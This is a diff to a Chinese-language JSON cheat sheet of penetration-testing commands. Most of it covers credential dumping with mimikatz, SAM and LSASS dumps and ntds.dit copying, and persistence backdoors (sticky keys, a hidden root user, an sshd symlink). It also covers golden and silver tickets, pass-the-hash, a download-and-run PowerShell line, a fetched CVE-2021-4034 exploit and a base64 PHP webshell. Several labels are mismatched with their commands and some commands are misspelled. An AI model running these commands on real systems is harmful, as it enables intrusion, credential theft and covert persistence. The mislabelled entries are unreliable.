@@ -1,4 +1,352 @@
 {
+	"凭证获取": {
+		"mimikatz查看当前密码": {
+			"Windows": [
+				{
+					"command": "mimikatz \"log\" \"privilege:debug\" \"sekurlsa:logonpasswords\" \"exit\"",
+					"describe": "使用mimikatz获取当前登录会话的密码信息"
+				},
+				{
+					"command": "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"log hash.txt\" \"sekurlsa::logonPasswords full\" \"exit\"",
+					"describe": "使用mimikatz抓取密码"
+				}
+			]
+		},
+		"mimikatz抓取domain密码": {
+			"Windows": [
+				{
+					"command": "mimikatz \"lsadump::dcsync /domain:test.com /all /csv\" \"exit\"",
+					"describe": "使用mimikatz从指定域抓取所有账户的密码哈希信息，并保存为CSV文件"
+				}
+			]
+		},
+		"reg导出注册表hash": {
+			"Windows": [
+				{
+					"command": "reg save hklm\\sam c:\\programdata\\sam.hive && reg save hklm\\system c:\\programdata\\system.hive",
+					"describe": "导出SAM和SYSTEM注册表文件到指定路径，以便后续分析"
+				}
+			]
+		},
+		"mimikatz读取注册表导出的hash信息": {
+			"Windows": [
+				{
+					"command": "mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\"",
+					"describe": "使用mimikatz读取从注册表导出的SAM和SYSTEM文件中的密码哈希信息"
+				}
+			]
+		},
+		"impacket包的secretsdump": {
+			"Windows": [
+				{
+					"command": "DumpMinitool.exe --file dump.txt --processId 948 --dumpType Full",
+					"describe": "使用impacket的secretsdump工具从SAM和SYSTEM文件中提取密码哈希信息"
+				}
+			]
+		},
+		"具有微软签名的DumpMinitool.exe工具导出内存": {
+			"Windows": [
+				{
+					"command": "secretsdump.exe -sam sam.hive -system system.hive LOCAL",
+					"describe": "使用impacket的secretsdump工具从SAM和SYSTEM文件中提取密码哈希信息"
+				}
+			]
+		},
+		"procdump导出内存文件": {
+			"Windows": [
+				{
+					"command": "powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {pid} {output} full\"",
+					"describe": "利用PowerShell导出内存"
+				}
+			]
+		},
+		"PowerShell导出内存": {
+			"Windows": [
+				{
+					"command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+					"describe": "第一步：创建快照 产生的快照GUID为：{850bc5ab-7620-48fa-bd1f-c23c8150a3f0}"
+				}
+			]
+		},
+		"获取系统保存的RDP密码": {
+			"Windows": [
+				{
+					"command": "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /s",
+					"describe": "查询远程连接记录"
+				},
+				{
+					"command": "privilege::debug\ndpapi::cred /in:{凭证文件}\nsekurlsa::dpapi\ndpapi::cred /in:{凭证文件} /masterkey:{MasterKey}\nexit",
+					"describe": "解密出明文RDP连接密码, 使用mimikatz执行"
+				}
+			]
+		},
+		"获取系统保存的VPN密码": {
+			"Windows": [
+				{
+					"command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\"",
+					"describe": "使用mimikatz获取VPN密码"
+				}
+			]
+		},
+		"获取系统连接的WIFI密码": {
+			"Windows": [
+				{
+					"command": "for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear",
+					"describe": "获取系统连接的无线网WIFI密码"
+				}
+			]
+		},
+		"卷影拷贝获取域控凭证": {
+			"Windows": [
+				{
+					"command": "ntdsutil.exe snapshot \"activate instance ntds\" create quit quit",
+					"describe": "第一步：创建快照 产生的快照GUID为：{850bc5ab-7620-48fa-bd1f-c23c8150a3f0}"
+				},
+				{
+					"command": "ntdsutil.exe snapshot \"mount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\" quit quit",
+					"describe": "第二步：加载快照 快照位置：C:\\$SNAP_202009222211_VOLUMEC$\\"
+				},
+				{
+					"command": "copy 'C:\\$SNAP_202009222211_VOLUMEC$\\Windows\\NTDS\\ntds.dit' C:\\ntds.dit",
+					"describe": "第三步：复制快照中的ntds.dit文件"
+				},
+				{
+					"command": "ntdsutil.exe snapshot \"List All\" quit quit\nntdsutil.exe snapshot \"umount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\" \"delete {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}\" quit quit\nntdsutil.exe snapshot \"List All\" quit quit",
+					"describe": "第四步：删除快照"
+				}
+			]
+		}
+	},
+	"权限维持": {
+		"粘滞键后门": {
+			"Windows": [
+				{
+					"command": "pushd C:\\windows\\system32",
+					"describe": "临时切换当前目录到Windows的System32文件夹，使用pushd会保存之前的目录位置。"
+				},
+				{
+					"command": "move sethc.exe sethc.exe.bak",
+					"describe": "将系统中负责粘滞键功能的sethc.exe文件重命名为sethc.exe.bak，备份原始文件。"
+				},
+				{
+					"command": "copy cmd.exe sethc.exe",
+					"describe": "将cmd.exe文件复制并覆盖sethc.exe，从而在粘滞键激活时启动命令提示符。"
+				}
+			]
+		},
+		"克隆账号": {
+			"Windows": [
+				{
+					"command": "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd",
+					"describe": "将一个账号当前的权限以及账号相关信息克隆到另外一个新账户中, 如果被克隆账号被禁用, 则无法克隆"
+				}
+			]
+		},
+		"伪造黄金票据(伪造TGT)": {
+			"Windows": [
+				{
+					"command": "net group \"domain admins\" /domain",
+					"describe": "获取管理员账号"
+				},
+				{
+					"command": "ipconfig /all",
+					"describe": "获取域名"
+				},
+				{
+					"command": "wmic useraccount get name,sid",
+					"describe": "获取域内所有用户sid"
+				},
+				{
+					"command": "whomai /user",
+					"describe": "获取当前用户sid"
+				},
+				{
+					"command": "minikatz.exe \"lsadump::dcsync /domain:test.com /user:krbtgt /csv\" exit",
+					"describe": "导出krbtgt的ntml hash (使用mimikatz工具的dcsysc功能远程转储活动目录的ntds.dit并导出krbtgt账号信息)"
+				},
+				{
+					"command": "kerberos::purge 或 klist purge",
+					"describe": "使用mimikatz清空票据"
+				},
+				{
+					"command": "kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi",
+					"describe": "生成票据"
+				},
+				{
+					"command": "Kerberos::ptt golden.kiribi",
+					"describe": "传递票据并注入"
+				},
+				{
+					"command": "Kerberos::tgt",
+					"describe": "查看当前会话中的票据"
+				},
+				{
+					"command": "dir \\\\dc\\c$",
+					"describe": "验证权限"
+				}
+			]
+		},
+		"伪造白银票据(伪造TGS)": {
+			"Windows": [
+				{
+					"command": "ipconfig /all",
+					"describe": "获取域名"
+				},
+				{
+					"command": "wmic useraccount get name,sid",
+					"describe": "获取域SID（获取域内所有用户SID）"
+				},
+				{
+					"command": "whomai /user",
+					"describe": "获取当前用户SID"
+				},
+				{
+					"command": "Mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+					"describe": "获取服务账号的NTLM Hash（需要管理员权限）"
+				},
+				{
+					"command": "kerberos::purge",
+					"describe": "清空票据（在mimikatz中输入）"
+				},
+				{
+					"command": "mimikatz \"kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt\" exit",
+					"describe": "生成白银票据（需要指定目标服务器的FQDN、服务和NTLM散列）"
+				},
+				{
+					"command": "Kerberos::tgt",
+					"describe": "查看当前会话中的票据"
+				},
+				{
+					"command": "dir \\\\dc\\c$",
+					"describe": "验证权限"
+				}
+			]
+		},
+		"SSH软链接": {
+			"Linux": [
+				{
+					"command": "useradd -p `openssl passwd -1 -salt 'support' Passw0rd` -o -u 0 -g root -G root -s /bin/bash -d /home/support",
+					"describe": "创建一个具有Root权限的账户，用户名为support，密码为Passw0rd。"
+				},
+				{
+					"command": "useradd -p `openssl passwd -1 -salt 'support' Passw0rd` support",
+					"describe": "创建一个普通权限的账户，用户名为support，密码为Passw0rd。"
+				},
+				{
+					"command": "service iptables stop",
+					"describe": "停止iptables服务，以便进行后门植入。"
+				},
+				{
+					"command": "ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=20020",
+					"describe": "创建一个指向sshd的软链接，并启动一个监听在20020端口的后门。"
+				},
+				{
+					"command": "ssh root@IP -p 20020",
+					"describe": "通过SSH连接到目标IP，使用端口20020进行登录。"
+				}
+			]
+		}
+	},
+	"横向移动": {
+		"445端口SMB哈希传递": {
+			"Windows": [
+				{
+					"command": "psexec.exe /accepteula /s \\\\127.0.0.1 -u cloud/administrator -p P@ssw0rd -s cmd",
+					"describe": "使用impacket套件的psexec.exe工具，以system权限运行远程进程。需要开放445端口，并且远程系统需要开启admin$共享。创建或删除服务时会产生大量日志。"
+				},
+				{
+					"command": "mmcexec.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1",
+					"describe": "使用impacket套件的mmcexec工具，通过SMB哈希进行远程命令执行。"
+				},
+				{
+					"command": "smbclient.exe cloud/administrator:P@ssw0rd@127.0.0.1",
+					"describe": "使用impacket套件的smbclient工具，通过密码进行SMB连接。"
+				},
+				{
+					"command": "smbclient.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1",
+					"describe": "使用impacket套件的smbclient工具，通过SMB哈希进行连接。"
+				}
+			]
+		},
+		"135端口WMI哈希传递": {
+			"Windows": [
+				{
+					"command": "wmiexec.exe cloud/administrator:P@ssw0rd@127.0.0.1",
+					"describe": "使用impacket套件的wmiexec工具，通过WMI进行哈希传递。Windows操作系统默认不会产生日志，相较于PsExec隐蔽性更好。"
+				},
+				{
+					"command": "wmiexec.exe -hashes :e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1",
+					"describe": "使用impacket套件的wmiexec工具，通过WMI进行哈希传递，使用哈希认证。"
+				}
+			]
+		},
+		"查看远程计算机进程": {
+			"Windows": [
+				{
+					"command": "tasklist /S 192.168.31.17 /U domain\\administrator /P /V",
+					"describe": "查看远程计算机上的进程信息。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "ssh user@192.168.31.17 'ps aux'",
+					"describe": "通过 SSH 登录到远程计算机并查看其所有进程信息。"
+				}
+			]
+		},
+		"网络Ping探测": {
+			"Windows": [
+				{
+					"command": "for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i \"ttl\"",
+					"describe": "对192.168.0.1到192.168.0.255的IP地址进行ping操作，检查响应中的TTL值以探测网络设备的存在。"
+				},
+				{
+					"command": "for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i \"ttl\">>\"c:\\\\a.txt\"",
+					"describe": "对192.168.0.1到192.168.0.255的IP地址进行ping操作，将结果输出到c:\\a.txt文件中。"
+				},
+				{
+					"command": "for /l %i in (1,1,255) do @ping 192.168.%i.1 -w 1 -n 1 | find /i \"ttl\"",
+					"describe": "对192.168.1.1到192.168.255.1的IP地址进行ping操作，检查响应中的TTL值以探测网络设备的存在。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "for i in {1..255}; do ping -c 1 -W 1 192.168.0.$i | grep 'ttl='; done",
+					"describe": "对192.168.0.1到192.168.0.255的IP地址进行ping操作，检查响应中的TTL值以探测网络设备的存在。"
+				},
+				{
+					"command": "for i in {1..255}; do ping -c 1 -W 1 192.168.0.$i >> /tmp/a.txt; done",
+					"describe": "对192.168.0.1到192.168.0.255的IP地址进行ping操作，将结果输出到/tmp/a.txt文件中。"
+				},
+				{
+					"command": "for i in {1..255}; do ping -c 1 -W 1 192.168.$i.1 | grep 'ttl='; done",
+					"describe": "对192.168.1.1到192.168.255.1的IP地址进行ping操作，检查响应中的TTL值以探测网络设备的存在。"
+				}
+			]
+		}
+	},
+	"权限提升": {
+		"Polkit工具提权": {
+			"Linux": [
+				{
+					"command": "find / -perm -u=s -type f 2> /dev/null",
+					"describe": "查找系统中具有SUID位的文件，这些文件可能允许权限提升。"
+				},
+				{
+					"command": "wget --no-check-certificate https://github.com/dzonerzy/poc-cve-2021-4034/releases/download/v0.2/exploit -O /tmp/.ICE-unix/run 2>&1 > /dev/null",
+					"describe": "下载CVE-2021-4034的漏洞利用工具到/tmp/.ICE-unix/run。"
+				},
+				{
+					"command": "chmod +x /tmp/.ICE-unix/run",
+					"describe": "给予下载的漏洞利用工具执行权限。"
+				},
+				{
+					"command": "/tmp/.ICE-unix/run",
+					"describe": "执行CVE-2021-4034漏洞利用工具。"
+				}
+			]
+		}
+	},
 	"获取操作系统信息": {
 		"查看操作系统版本": {
 			"Windows": [
@@ -1567,97 +1915,7 @@
 			]
 		}
 	},
-	"Wmic命令": {
-		"wmic远程连接机器": {
-			"Windows": [
-				{
-					"command": "wmic /node:\"192.168.1.20\" /user:\"domain\\administrator\" /password:\"123456\"",
-					"describe": "使用wmic远程连接到指定IP的机器，并以指定用户和密码进行认证"
-				}
-			]
-		},
-		"查看系统安装软件": {
-			"Windows": [
-				{
-					"command": "wmic product get name,version",
-					"describe": "列出系统中安装的软件及其版本信息"
-				}
-			]
-		},
-		"查看系统版本": {
-			"Windows": [
-				{
-					"command": "wmic OS get Caption,CSDVersion,OSArchitecture,Version",
-					"describe": "获取系统的版本信息，包括操作系统名称、服务包版本、体系结构和版本号"
-				}
-			]
-		},
-		"根据Pid查找进程路径": {
-			"Windows": [
-				{
-					"command": "wmic process get name,executablepath,processid|findstr pid",
-					"describe": "根据进程ID查找进程的名称、路径及ID"
-				}
-			]
-		},
-		"查看磁盘信息": {
-			"Windows": [
-				{
-					"command": "Wmic logicaldisk",
-					"describe": "查看系统中的逻辑磁盘信息"
-				}
-			]
-		},
-		"查看组、hostname等信息": {
-			"Windows": [
-				{
-					"command": "wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list",
-					"describe": "获取计算机系统的名称、域、制造商、型号、用户名和角色信息"
-				}
-			]
-		}
-	},
 	"常用工具命令": {
-		"mimikatz查看当前密码": {
-			"Windows": [
-				{
-					"command": "mimikatz \"log\" \"privilege:debug\" \"sekurlsa:logonpasswords\" \"exit\"",
-					"describe": "使用mimikatz获取当前登录会话的密码信息"
-				}
-			]
-		},
-		"mimikatz抓取domain密码": {
-			"Windows": [
-				{
-					"command": "mimikatz \"lsadump::dcsync /domain:test.com /all /csv\" \"exit\"",
-					"describe": "使用mimikatz从指定域抓取所有账户的密码哈希信息，并保存为CSV文件"
-				}
-			]
-		},
-		"reg导出注册表hash": {
-			"Windows": [
-				{
-					"command": "reg save hklm\\sam c:\\programdata\\sam.hive && reg save hklm\\system c:\\programdata\\system.hive",
-					"describe": "导出SAM和SYSTEM注册表文件到指定路径，以便后续分析"
-				}
-			]
-		},
-		"mimikatz读取注册表导出的hash信息": {
-			"Windows": [
-				{
-					"command": "mimikatz \"log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" \"exit\"",
-					"describe": "使用mimikatz读取从注册表导出的SAM和SYSTEM文件中的密码哈希信息"
-				}
-			]
-		},
-		"impacket包的secretsdump": {
-			"Windows": [
-				{
-					"command": "secretsdump.exe -sam sam.hive -system system.hive LOCAL",
-					"describe": "使用impacket的secretsdump工具从SAM和SYSTEM文件中提取密码哈希信息"
-				}
-			]
-		},
 		"nmap扫描永恒之蓝漏洞": {
 			"Windows": [
 				{
@@ -1782,6 +2040,74 @@
 		}
 	},
 	"其他常用命令": {
+		"压缩文件": {
+			"Windows": [
+				{
+					"command": "7z.exe a OutputFile InputFile",
+					"describe": "使用7-Zip工具将InputFile压缩成OutputFile。"
+				},
+				{
+					"command": "rar.exe a OutputFile InputFile",
+					"describe": "使用RAR工具将InputFile压缩成OutputFile。"
+				},
+				{
+					"command": "powershell Compress-Archive -Path {source} -DestinationPath {destination}",
+					"describe": "使用 PowerShell 的 Compress-Archive 命令压缩文件或文件夹。{source} 是源文件或文件夹的路径，{destination} 是压缩文件的路径。"
+				},
+				{
+					"command": "tar -a -cf {destination} {source}",
+					"describe": "使用 tar 工具创建一个压缩归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "tar -cvzf {destination}.tar.gz {source}",
+					"describe": "使用 tar 工具创建一个 gzip 压缩的归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件的基本名称。"
+				},
+				{
+					"command": "zip -r {destination}.zip {source}",
+					"describe": "使用 zip 工具创建一个压缩文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+				}
+			]
+		},
+		"解压文件": {
+			"Windows": [
+				{
+					"command": "7z.exe x InputFile OutputFile",
+					"describe": "使用7-Zip工具将InputFile解压到OutputFile。"
+				},
+				{
+					"command": "rar.exe x InputFile OutputFile",
+					"describe": "使用RAR工具将InputFile解压到OutputFile。"
+				},
+				{
+					"command": "powershell Expand-Archive -Path {source} -DestinationPath {destination}",
+					"describe": "使用 PowerShell 的 Expand-Archive 命令解压文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+				},
+				{
+					"command": "tar -xf {source} -C {destination}",
+					"describe": "使用 tar 工具解压归档文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "tar -cvzf {destination}.tar.gz {source}",
+					"describe": "使用 tar 工具创建一个 gzip 压缩的归档文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件的基本名称。"
+				},
+				{
+					"command": "zip -r {destination}.zip {source}",
+					"describe": "使用 zip 工具创建一个压缩文件。{source} 是要压缩的文件或文件夹，{destination} 是生成的压缩文件路径。"
+				},
+				{
+					"command": "tar -xvzf {source}.tar.gz -C {destination}",
+					"describe": "使用 tar 工具解压 gzip 压缩的归档文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+				},
+				{
+					"command": "unzip {source}.zip -d {destination}",
+					"describe": "使用 unzip 工具解压 zip 格式的压缩文件。{source} 是压缩文件的路径，{destination} 是解压后的目标路径。"
+				}
+			]
+		},
 		"创建隐藏文件": {
 			"Windows": [
 				{
@@ -1825,6 +2151,118 @@
 				{
 					"command": "echo -n \"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4+\" | base64 -d > logo.php",
 					"describe": "将base64编码的字符串解码为logo.php文件，绕过杀软拦截"
+				}
+			]
+		},
+		"查看历史命令": {
+			"Windows": [
+				{
+					"command": "type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+					"describe": "查看当前用户PowerShell的历史命令记录。"
+				},
+				{
+					"command": "type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+					"describe": "查看所有用户PowerShell的历史命令记录。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "cat ~/.bash_history",
+					"describe": "查看当前用户 Bash 的历史命令记录。"
+				},
+				{
+					"command": "cat /var/log/auth.log | grep 'COMMAND' ",
+					"describe": "查看系统日志中记录的历史命令（可能需要 root 权限）。"
+				}
+			]
+		},
+		"计算文件hash": {
+			"Windows": [
+				{
+					"command": "certutil.exe -hashfile 1.txt",
+					"describe": "使用 certutil 工具计算指定文件的哈希值。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "sha256sum 1.txt",
+					"describe": "计算指定文件的 SHA-256 哈希值。"
+				},
+				{
+					"command": "md5sum 1.txt",
+					"describe": "计算指定文件的 MD5 哈希值。"
+				}
+			]
+		},
+		"强制停止进程": {
+			"Windows": [
+				{
+					"command": "taskkill /f /pid 3352",
+					"describe": "强制停止指定 PID（3352）的进程。"
+				},
+				{
+					"command": "taskkill /f /im explor.exe",
+					"describe": "强制停止指定名称（explor.exe）的进程。"
+				}
+			],
+			"Linux": [
+				{
+					"command": "kill -9 3352",
+					"describe": "强制停止指定 PID（3352）的进程。"
+				},
+				{
+					"command": "pkill -9 process_name",
+					"describe": "强制停止指定名称（process_name）的进程。"
+				}
+			]
+		}
+	},
+	"Wmic常用命令": {
+		"wmic远程连接机器": {
+			"Windows": [
+				{
+					"command": "wmic /node:\"192.168.1.20\" /user:\"domain\\administrator\" /password:\"123456\"",
+					"describe": "使用wmic远程连接到指定IP的机器，并以指定用户和密码进行认证"
+				}
+			]
+		},
+		"查看系统安装软件": {
+			"Windows": [
+				{
+					"command": "wmic product get name,version",
+					"describe": "列出系统中安装的软件及其版本信息"
+				}
+			]
+		},
+		"查看系统版本": {
+			"Windows": [
+				{
+					"command": "wmic OS get Caption,CSDVersion,OSArchitecture,Version",
+					"describe": "获取系统的版本信息，包括操作系统名称、服务包版本、体系结构和版本号"
+				}
+			]
+		},
+		"根据Pid查找进程路径": {
+			"Windows": [
+				{
+					"command": "wmic process get name,executablepath,processid|findstr pid",
+					"describe": "根据进程ID查找进程的名称、路径及ID"
+				}
+			]
+		},
+		"查看磁盘信息": {
+			"Windows": [
+				{
+					"command": "Wmic logicaldisk",
+					"describe": "查看系统中的逻辑磁盘信息"
+				}
+			]
+		},
+		"查看组、hostname等信息": {
+			"Windows": [
+				{
+					"command": "wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list",
+					"describe": "获取计算机系统的名称、域、制造商、型号、用户名和角色信息"
 				}
 			]
 		}
